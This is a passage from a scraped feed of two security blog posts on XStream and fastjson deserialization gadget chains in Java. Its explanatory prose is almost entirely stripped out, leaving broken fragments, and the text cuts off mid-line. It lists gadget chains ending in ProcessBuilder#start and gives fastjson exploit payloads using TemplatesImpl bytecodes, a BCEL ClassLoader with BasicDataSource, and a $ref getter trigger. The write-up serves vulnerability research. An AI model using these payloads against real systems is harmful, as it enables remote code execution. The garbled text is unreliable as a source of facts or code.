title="ConvertedClosure"></a>ConvertedClosure</h3><p><code>ConvertedClosure</code><code>InvocationHandler</code>handlerinvoke</p><p><code>ConvertedClosure</code><code>org.codehaus.groovy.runtime.ConversionHandler#invoke</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418142036889.png" alt="image-20200418142036889"></p><p>Object(toStringhashCode)<code>GroovyObject</code><code>invokeCustom</code><code>org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418171210630.png" alt="image-20200418171210630"></p><p><code>MethodClosure</code><code>call</code><a href="https://paper.seebug.org/1171/" target="_blank" rel="noopener"></a></p><p><code>invokeCustom</code><code>MapConverter</code><code>TreeSetConverter</code></p><p><code>TreeSetConverter</code><code>Map</code><code>hashCode</code><code>TreeSet</code><code>compareTo</code><code>hashCode</code>Object<code>checkMethod</code>POC<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/xstream/GroovyConvertedClosure.java" target="_blank" rel="noopener">ysomap</a></p><p>PS<code>compareTo</code><code>MethodClosure</code>String<code>Runtime.exec</code></p><h2 id="3-Groovy-Expando"><a href="#3-Groovy-Expando" class="headerlink" title="3. Groovy Expando"></a>3. Groovy Expando</h2><p><code>TreeSet</code><code>Map</code><code>Map</code><code>hashCode</code></p><p><code>groovy.util.Expando#hashCode</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418174424715.png" alt="image-20200418174424715"></p><p><code>expandoProperties</code><code>hashCode:methodclosure</code><code>MethodClosure</code><code>call</code><code>ConvertedClosure</code><code>ProcessBuilder.start</code>fastjsongetters<a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/payload/xstream/GroovyExpando.java" target="_blank" rel="noopener">POC</a></p><h2 id="4-ImageIO-ContainsFilter"><a href="#4-ImageIO-ContainsFilter" class="headerlink" title="4. ImageIO$ContainsFilter"></a>4. ImageIO$ContainsFilter</h2><p><code>TreeSet</code>put<code>compareTo</code><code>HashMap</code>put<code>hashCode</code>marshalsec<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/ImageIO.java" target="_blank" rel="noopener">ImageIO</a><code>Iterator.next</code></p><p>XStream<code>Map</code><code>hashCode</code></p><p><code>jdk.nashorn.internal.objects.NativeString#hashCode</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416162110270.png" alt="image-20200416162110270"></p><p><code>getStringValue</code><code>this.value.toString()</code>value<code>CharSequence</code><code>CharSequence</code><code>com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416164810572.png" alt="image-20200416164810572"></p><p><code>ByteArrayOutputStreamEx</code><code>readFrom</code>InputStreamread</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416165222727.png" alt="image-20200416165222727"></p><p><code>is</code><code>this.dataHandler.getDataSource().getInputStream()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. this.dataHandler == DataHandler</span><br><span class="line">2. DataHandlerdataSource == XmlDataSource</span><br><span class="line">3. XmlDataSourcegetInputStream()inputStream</span><br><span class="line"></span><br><span class="line">// com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource</span><br></pre></td></tr></table></figure><p><code>inputStream</code><code>read</code></p><p><code>javax.crypto.CipherInputStream#read</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416170450515.png" alt="image-20200416170450515"></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416170531566.png" alt="image-20200416170531566"></p><p><code>Cipher</code><code>Cipher.update</code><code>javax.crypto.NullCipher</code><code>Cipher.update</code><code>update</code></p><p><code>Cipher.update</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416170954216.png" alt="image-20200416170954216"></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416171051157.png" alt="image-20200416171051157"></p><p><code>serviceIterator.next</code></p><p>ImageIO<code>javax.imageio.spi.FilterIterator#next</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416171636844.png" alt="image-20200416171636844"></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416171715068.png" alt="image-20200416171715068"></p><p><code>advance</code><code>filter.filter</code>ImageIOfilter</p><p><code>javax.imageio.ImageIO.ContainsFilter#filter</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200416171927622.png" alt="image-20200416171927622"></p><p>MethodinvokeJavamethod</p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">XStream Map jdk.nashorn.internal.objects.NativeString#hashCode</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</span><br><span class="line">javax.activation.DataHandler#getDataSource</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream</span><br><span class="line">javax.crypto.CipherInputStream#read -&gt; getMoreData</span><br><span class="line">javax.crypto.NullCipher#update -&gt; chooseFirstProvider</span><br><span class="line">javax.imageio.spi.FilterIterator#next</span><br><span class="line">javax.imageio.ImageIO.ContainsFilter#filter</span><br><span class="line">ProcessBuilder#start</span><br></pre></td></tr></table></figure><p><code>Iterator.next</code><code>Iterator</code><code>javax.imageio.ImageIO.ContainsFilter#filter</code>XD</p><h2 id="5-ServiceFinder-LazyIterator"><a href="#5-ServiceFinder-LazyIterator" class="headerlink" title="5. ServiceFinder$LazyIterator"></a>5. ServiceFinder$LazyIterator</h2><p><a href="https://www.anquanke.com/post/id/172198#h2-4" target="_blank" rel="noopener">1</a><a href="[https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-%E7%A9%BA%E6%8C%87%E9%92%88CTF%E4%B8%80%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9BWriteup/](https://meizjm3i.github.io/2020/01/09/Jenkins-2-101-XStream-Rce-CTFWriteup/">2</a>)</p><p><code>java.util.ServiceLoader.LazyIterator#next</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417164755804.png" alt="image-20200417164755804"></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417164854625.png" alt="image-20200417164854625"></p><p><code>acc</code><code>nextService</code><code>Class.forName</code><code>classname</code><code>loader</code></p><p>BCELClassLoaderclassname(fastjson)</p><p>ImageIO<code>Iterator.next</code><code>LazyIterator</code></p><h3 id="BCEL-ClassLoaderPOC"><a href="#BCEL-ClassLoaderPOC" class="headerlink" title="BCEL ClassLoaderPOC"></a>BCEL ClassLoaderPOC</h3><p>POC<code>ClassLoader</code><code>ClassLoader</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417225056222.png" alt="image-20200417225056222"></p><p><code>ClassLoader</code></p><p></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417225303428.png" alt="image-20200417225303428"></p><p><code>ignored_packages</code><code>deferTo</code>BCELClassLoader</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417225600161.png" alt="image-20200417225600161"></p><p></p><p>BCEL<code>ClassLoader.loadClass</code>4</p><ol><li><p>ClassLoaderclasses</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417225808446.png" alt="image-20200417225808446"></p></li><li><p><code>java./sun./javax.</code><code>deferTo</code><code>deferTo</code>ClassLoader<code>ClassLoader.getSystemClassLoader()</code>)</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417230040882.png" alt="image-20200417230040882"></p></li><li><p>classname<code>$$BCEL$$</code>classnamedefineClass</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417230343866.png" alt="image-20200417230343866"></p></li><li><p><code>repository</code>classnameClass</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417230451954.png" alt="image-20200417230451954"></p><p>PS<code>repository</code><code>SyntheticRepository.getInstance()</code>ClassLoader</p></li></ol><p><code>ignored_packages</code><code>deferTo</code><code>java.lang.Object</code>4<code>java.lang.Object</code><code>ClassNotFoundException</code></p><p><code>classes</code>class</p><p><code>Runtime</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200417231357924.png" alt="image-20200417231357924"></p><p>ObjectObject</p><h1 id="0x03-XStream"><a href="#0x03-XStream" class="headerlink" title="0x03 XStream"></a>0x03 XStream</h1><hr><p>XStream1.4.7<a href="http://x-stream.github.io/security.html" target="_blank" rel="noopener">security</a></p><blockquote><p>Starting with XStream 1.4.7, it is possible to define <a href="http://x-stream.github.io/security.html#framework" target="_blank" rel="noopener">permissions</a> for types, to check the type of an object that should be unmarshalled. Those permissions can be used to allow or deny types explicitly With these permissions it is at least not possible to inject unexpected types into an object graph. The security framework supports the setup of a black or white listing scenario. Any application should use this feature to limit the danger of arbitrary command execution if it deserializes data from an external source.</p><p>XStream itself sets up a black list by default, i.e. it blocks all currently known critical classes of the Java runtime. Main reason for the black list is compatibility, because otherwise newer versions of XStream 1.4.x can no longer be used as drop-in replacement. Unfortunately this provides a false sense of security. Every XStream client should therefore switch to a white listing on its own as soon as possible. XStream itself will use white listing as default starting with 1.5.x and only clients that have also changed their setup will be able to use this newer version again as drop-in replacement.</p></blockquote><p></p><h2 id="1-4-7-1-4-9"><a href="#1-4-7-1-4-9" class="headerlink" title="1.4.7-1.4.9"></a>1.4.7-1.4.9</h2><p><code>EventHandler</code><code>ReflectionConverter</code>1.4.7-1.4.9<code>canConvert</code><code>EventHandler</code></p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418185546291.png" alt="image-20200418185546291"></p><p><code>EventHandler</code>POC</p><h2 id="gt-1-4-10"><a href="#gt-1-4-10" class="headerlink" title="&gt;=1.4.10"></a>&gt;=1.4.10</h2><p>1.4.10<code>setupDefaultSecurity</code><code>EventHandler</code>POC<code>1.4.10</code></p><p><code>InternalBlackList</code>converter<code>LOW</code><code>ReflectionConverter</code><code>Very_low</code>XStreamconverters</p><p><img src="/images/talk-about-xstream-deserialization-20200418/image-20200418192827552.png" alt="image-20200418192827552"></p><p>1,4,5groovyXStream</p><h1 id="0x04-"><a href="#0x04-" class="headerlink" title="0x04 "></a>0x04 </h1><hr><p></p><p>XStreamGroovy</p><p>XStreamHashMapTreeSet<code>hashCode</code><code>compareTo</code></p><p>PSPOC<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">GitHub</a></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesfastjson</title>
      <link href="2020/04/13/java/talk-about-fastjson-deserialization/"/>
      <url>2020/04/13/java/talk-about-fastjson-deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><p>fastjson</p><a id="more"></a><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><hr><h2 id="1-fastjson"><a href="#1-fastjson" class="headerlink" title="(1). fastjson"></a>(1). fastjson</h2><blockquote><p>fastjsonJSONJSONJava BeanJSONJSONJavaBean</p></blockquote><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String phoneNumber;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Phone</span><span class="params">(String phoneNumber)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewPhone</span> <span class="keyword">extends</span> <span class="title">Phone</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String location;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">NewPhone</span><span class="params">(String phoneNumber, String location)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.phoneNumber = phoneNumber;</span><br><span class="line">        <span class="keyword">this</span>.location = location;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.phoneNumber+<span class="string">":"</span>+<span class="keyword">this</span>.location;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, Phone phone)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name+<span class="string">":"</span>+phone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3PersonPhoneNewPhonefastjsonPersonjson</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> Phone(<span class="string">"1234567890"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output </span></span><br><span class="line"><span class="comment">// &#123;"name":"john","phone":&#123;"phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890</span></span><br></pre></td></tr></table></figure><p>fastjsontoJSONStringobjectjsonparseObjectjson</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> NewPhone(<span class="string">"1234567890"</span>,<span class="string">"China"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// &#123;"name":"john","phone":&#123;"location":"China","phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890</span></span><br></pre></td></tr></table></figure><p>fastjsonPersonPhoneNewPhonefastjsonNewPhoneJsonphonelocationfastjson<code>@type</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Phone phone = <span class="keyword">new</span> NewPhone(<span class="string">"1234567890"</span>,<span class="string">"China"</span>);</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"john"</span>, phone);</span><br><span class="line">String json = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(json);</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"><span class="comment">// output</span></span><br><span class="line"><span class="comment">// &#123;"@type":"org.vultest.base.Person","name":"john","phone":&#123;"@type":"org.vultest.base.NewPhone","location":"China","phoneNumber":"1234567890"&#125;&#125;</span></span><br><span class="line"><span class="comment">// john:1234567890:China</span></span><br></pre></td></tr></table></figure><p>toJSONStringSerializerFeatureSerializerFeature.WriteClassNamejson<code>@type</code>classPersonphoneNewPhonelocation</p><p><code>@type</code></p><h2 id="2-fastjson"><a href="#2-fastjson" class="headerlink" title="(2).fastjson"></a>(2).fastjson</h2><blockquote><p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p></blockquote><p></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/1564368830000-15632616584384.jpg" alt="img"></p><p>ASMdump</p><p>ASMbytecodesideadump</p><p><code>com/alibaba/fastjson/parser/deserializer/ASMDeserializerFactory.java#80</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200104200324167.png" alt="image-20200104200324167"></p><p>bytecodescode<code>(new FileOutputStream(&quot;some.class&quot;)).write(code)</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200104200849550.png" alt="image-20200104200849550"></p><h2 id="3-fastjson-gettersetter"><a href="#3-fastjson-gettersetter" class="headerlink" title="(3).  fastjson gettersetter"></a>(3).  fastjson gettersetter</h2><p>JavareadObjectfastjson</p><ul><li></li><li>getter</li><li>setter</li></ul><p>fastjsonparseparseObjectpsgetters</p><h3 id="1-parse--parseObject"><a href="#1-parse--parseObject" class="headerlink" title="1. parse  parseObject"></a>1. parse  parseObject</h3><p>parseObject</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200409201548997.png" alt="image-20200409201548997"></p><p>parseObject<code>JSON.parse</code><code>toJSON</code></p><p><code>toJSON</code>obj<code>JSONObject</code>new<code>JSONObject</code>obj<code>toJSONString</code><code>JSONObject</code>json<code>parse</code>json</p><p><code>toJSONString</code>getters<code>parseObject</code>getterssetters<code>parse</code>settersgetters()</p><p><code>parseObject</code><code>parse</code>getters</p><h3 id="2-parse"><a href="#2-parse" class="headerlink" title="2. parse"></a>2. parse</h3><p><code>JSON.parse</code>getterssetters</p><p>fastjson1.2.24</p><p><code>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java#deserialze</code>psdeserializei</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106094637943.png" alt="image-20200106094637943"></p><p>570createInstance</p><p>600parseField()</p><p>parseField</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106105841139.png" alt="image-20200106105841139"></p><p><code>com/alibaba/fastjson/parser/deserializer/DefaultFieldDeserializer.java#parseField</code>83setValue</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106110005828.png" alt="image-20200106110005828"></p><p>setValuefastjsongettersetter</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106110837420.png" alt="image-20200106110837420"></p><p>gettersetterisvalueobjectelse</p><p>fieldInfogettersettersettergettergetter</p><p>fieldInfomethod<code>com/alibaba/fastjson/util/JavaBeanInfo.java#build</code>ParserConfig<code>createJavaBeanDeserializer</code><code>JavaBeanInfo.build</code>fieldInfomethod</p><p></p><p>setter</p><ul><li>4</li><li></li><li>void</li><li></li><li>set<code>unicde</code><code>_</code>f&gt;=55</li></ul><p>getter</p><ul><li>4</li><li></li><li>get</li><li>0</li><li>CollectionMapAtomicBooleanAtomicIntegerAtomicLong</li><li>setter</li></ul><p>gettersetter<code>com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java#setValue</code>invokereadObject</p><p>settergetterPersonsetTestjson<code>&quot;test&quot;:1</code><code>setTest</code></p><p><code>@type</code>gettersetter</p><h3 id="3-parsegetters"><a href="#3-parsegetters" class="headerlink" title="3. parsegetters"></a>3. parsegetters</h3><p></p><ol><li>tomcat bcelpoc</li><li>threedream<a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6" target="_blank" rel="noopener"></a></li></ol><h4 id="Tomcat-BCEL-POC"><a href="#Tomcat-BCEL-POC" class="headerlink" title="Tomcat BCEL POC"></a>Tomcat BCEL POC</h4><p>poc<code>JSONObject.toString</code><code>toString</code></p><p><code>toString</code><code>JSON</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410110654354.png" alt="image-20200410110654354"></p><p><code>toJSONString</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410110738399.png" alt="image-20200410110738399"></p><p>JSONObjectobj to str<code>JSON.toJSONString</code>gettersparse</p><p>JSONObjecttoString</p><p><code>com/alibaba/fastjson/parser/DefaultJSONParser.java#parseObject</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410121100651.png" alt="image-20200410121100651"></p><p>objectJSONObjectkey<code>toString</code><code>{</code>fastjsonJSONObject</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200410122509759.png" alt="image-20200410122509759"></p><p></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;some&#125;:x&#125;</span><br></pre></td></tr></table></figure><p>key<code>{}</code>(JSONObject)value<code>x</code>fastjson<code>key.toString</code><code>toString</code>key<code>toJSONString</code>keygettersparseparseObjectpoc</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="comment">// JSONObjectkeyJSONObject</span></span><br><span class="line">&#123;// JSONObjecttoJSONString</span><br><span class="line">"x":&#123;// getConnection</span><br><span class="line">"@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",</span><br><span class="line">"driverClassLoader": &#123;"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"&#125;,</span><br><span class="line">        "driverClassName": "$$BCEL$$$l$8b$I$A$..."</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;:"x"</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="-ref"><a href="#-ref" class="headerlink" title="$ref"></a><code>$ref</code></h4><p>fastjson&gt;=1.2.36<code>$ref</code>getter</p><p>1.2.48<code>$ref</code></p><p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject#388</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411145506512.png" alt="image-20200411145506512"></p><p><code>$ref</code>resolveTaskparse</p><p><code>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</code></p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411145811138.png" alt="image-20200411145811138"></p><p><code>JSONPath.eval</code>JSONPath<a href="https://github.com/alibaba/fastjson/wiki/JSONPath" target="_blank" rel="noopener"></a></p><p>eval<code>JSONPath.getPropertyValue</code>Segement<strong>$.value</strong>PropertySegement</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411153340074.png" alt="image-20200411153340074"></p><p>getterinvoke</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">json = <span class="string">"&#123;"</span> +</span><br><span class="line">          <span class="string">"\"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\","</span> +</span><br><span class="line">          <span class="string">"\"driverClassLoader\": &#123;\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"&#125;,"</span> +</span><br><span class="line">          <span class="string">"\"driverClassName\": \"$$BCEL$$$l$8b$I$A$...\","</span> +</span><br><span class="line">          <span class="string">"\"connection\":&#123;\"$ref\": \"$.connection\"&#125;"</span>+</span><br><span class="line"><span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure><p><code>getConnection</code>parseparseObject</p><h2 id="4-private"><a href="#4-private" class="headerlink" title="(4). private"></a>(4). private</h2><p>fastjonsetterprivateprivatesetterprivate<code>Feature.SupportNonPublicField</code></p><h1 id="0x02-EXP"><a href="#0x02-EXP" class="headerlink" title="0x02 EXP"></a>0x02 EXP</h1><hr><p>JavafastjsongettersetterPOC</p><h2 id="1-templatesimpl"><a href="#1-templatesimpl" class="headerlink" title="(1). templatesimpl"></a>(1). templatesimpl</h2><p><a href="http://xxlegend.com/2017/05/03/title- fastjson poc/" target="_blank" rel="noopener">http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p>settergetterCommons-Collectionstemplatesimplbytecodes()</p><p><code>newTransformer</code>templatesimplgetter</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106232029570.png" alt="image-20200106232029570"></p><p><code>outputProperties</code><code>getOutputProperties</code>setterprivateparseObject<code>Feature.SupportNonPublicField</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String jsonString = <span class="string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\","</span> +</span><br><span class="line">        <span class="string">"\"_name\":\"goodjob\",\"_tfactory\":&#123;&#125;,"</span> +</span><br><span class="line">        <span class="string">"\"_bytecodes\":[\"yv66vgAAADQAOgoAA...\"],"</span> +</span><br><span class="line">        <span class="string">"\"_outputProperties\":null&#125;"</span>;</span><br></pre></td></tr></table></figure><p>bytecodesysoserialpayload<code>_tfactory</code>nullbytecodes<code>_tfactory:{}</code>fastjsonTransformerFactoryImpl<em>tfactory`\</em>`smartMatch</p><p>byte[]fastjsonbase64</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200106233142450.png" alt="image-20200106233142450"></p><p>payloadbase64</p><p>pocfastjson parseObject<code>Feature.SupportNonPublicField</code></p><h2 id="2-JNDI"><a href="#2-JNDI" class="headerlink" title="(2). JNDI"></a>(2). JNDI</h2><p>JNDIlookupJNDI ReferenceRCE<code></code><code>setter</code><code>getter</code>lookupJNDI</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImpl</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200407105109680.png" alt="image-20200407105109680"></p><p>setAutoCommitconnectjdbc</p><p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200407105258958.png" alt="image-20200407105258958"></p><p>connectlookup<code>getDataSourceName</code><code>dataSource</code>fastjson<code>dataSource</code><code>autoCommit</code>JNDI</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 